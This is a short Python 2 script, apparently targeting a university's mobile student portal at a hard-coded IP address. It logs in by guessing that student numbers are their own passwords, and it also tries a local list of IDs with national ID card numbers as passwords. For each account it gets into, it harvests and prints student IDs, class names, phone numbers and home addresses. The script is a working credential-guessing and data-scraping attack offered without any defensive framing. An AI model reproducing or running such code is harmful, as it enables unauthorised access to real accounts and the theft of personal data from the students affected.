# -*- coding: utf-8 -*
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )

import requests
import json
import time
import random
import re

n = 20160000
while True:
    if n > 20150000:
        break
    n+=1
    s = requests.Session()
    par = int(random.random()*1e15)
    nn = str(n)
    user = nn
    password = nn
    callbackparam = 'jQuery2130'+str(par)+'_'+str(time.time())[:-3]+'000&{}&_='+str(time.time())[:-3]
    url = 'http://219.216.96.105:8080/neumobile//doLogin4mobile?user.loginType=3&user.username='+user+'&user.password='+password+'&callbackparam='+callbackparam
    r = s.get(url).text
    if re.findall('error',r)!=[]:
        print n,'登录失败'
    else:
        print json.loads(r[40:-2])['consoleUser']['nickname'],
        url = 'http://219.216.96.105:8080/neumobile//student/getUserInfoFromMobile?&callbackparam='+callbackparam+'&{}&_='+str(time.time())[:-3]
        #
        r = s.get(url).text
        data = r[40:-2]
        data = json.loads(data)['USERINFO']
        print data['stuid'],data['banjiName'],data['tel'],data['homeaddress']
f = open("/Users/FANGs/Documents/项目/各种语言/python/2015.txt")
r = f.read()
f.close()
r = json.loads(r)
for i in r['data']:
    print i['id'],i['idcard']
    s = requests.Session()
    par = int(random.random()*1e15)
    user = i['id']
    password = i['idcard']
    callbackparam = 'jQuery2130'+str(par)+'_'+str(time.time())[:-3]+'000&{}&_='+str(time.time())[:-3]
    url = 'http://219.216.96.105:8080/neumobile//doLogin4mobile?user.loginType=3&user.username='+user+'&user.password='+password+'&callbackparam='+callbackparam
    r = s.get(url).text
    if re.findall('error',r)!=[]:
        print n,'登录失败'
    else:
        print json.loads(r[40:-2])['consoleUser']['nickname'],
        url = 'http://219.216.96.105:8080/neumobile//student/getUserInfoFromMobile?&callbackparam='+callbackparam+'&{}&_='+str(time.time())[:-3]
        #
        r = s.get(url).text
        data = r[40:-2]
        data = json.loads(data)['USERINFO']
        print data
        print data['stuid'],data['banjiName'],data['tel'],data['homeaddress']
